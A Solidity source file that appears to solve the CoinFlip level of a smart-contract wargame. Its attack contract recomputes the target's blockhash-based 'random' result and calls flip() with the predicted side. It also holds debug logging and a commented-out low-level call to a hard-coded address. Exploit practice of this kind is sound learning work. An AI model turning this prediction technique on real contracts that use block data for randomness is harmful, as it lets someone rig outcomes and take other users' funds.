// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.4;

import { console } from "forge-std/console.sol";

import { CoinFlip } from "src/CoinFlip/CoinFlip.sol";

contract CoinFlipAttack {
    CoinFlip public coinFlipTarget;

    constructor() {
        coinFlipTarget = new CoinFlip();
    }
    function callCoinFlip() public returns (bool) {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        address coinFlipInstance = 0x677F2b9b7b5CAdC57dc27880004cb914494BA0F7;
        console.logString("GOT HEREEEEEEEEEEEEE 000");

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        console.logString("GOT HEREEEEEEEEEEEEE 111");
        // get function selector
        bytes4 flipSelector = bytes4(keccak256(bytes("flip(bool)")));
        // (bool success, ) = coinFlipInstance.call(abi.encodePacked(flipSelector, side));
        bool success = coinFlipTarget.flip(side);
        console.logString("GOT HEREEEEEEEEEEEEE 222");
        return success;

    }

    function getSelector(string calldata _func) private pure returns (bytes4) {
        return bytes4(keccak256(bytes(_func)));
    }
}
